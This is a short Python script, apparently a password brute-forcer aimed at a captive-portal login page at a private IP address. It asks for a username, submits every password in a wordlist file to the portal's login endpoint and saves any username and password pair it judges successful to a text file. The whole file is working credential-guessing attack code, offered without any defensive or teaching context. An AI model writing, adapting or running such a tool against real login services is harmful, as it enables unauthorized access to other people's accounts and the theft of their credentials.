#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Mar 11 10:34:42 2018

@author: rishi
"""

import os
import time
import sys
import urllib.request

user_name = input("Enter username: \n")
pass_list = open("passwordlist1.txt","r") 
url = "http://172.50.1.1:8090/login.xml"
user_list = open("userlist.txt","a")

def connectivity():
    try:
        print("Connecting to host")
        response=urllib.request.urlopen(url,timeout=20)
        print("Connected")
        return True
    except urllib.request.URLError as err: pass
    return False

flag = True

if connectivity()==True:
    while flag:
        pass_file_read = pass_list.readline()
        if pass_file_read == '':
            flag = 'False'
            print("End of File..!")
            sys.exit()
        
        passwd = pass_file_read[:-1]
        print(passwd)
        d = dict(mode='191', username=user_name, password=passwd, a= '1520749584416')

        data = urllib.parse.urlencode(d).encode("utf-8")
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req,data=data) as f:
            resp = f.read()
        code=resp.decode()
        return_value = code.find("in")
        
        if return_value != -1:
            print('YES')
            user_list.write('USERNAME: '+user_name+' \t PASSWORD: '+passwd)
            user_list.write("\n")
            break;
            
    time.sleep(5)
else:
    print("No connectivity to host")

pass_list.close()
user_list.close()
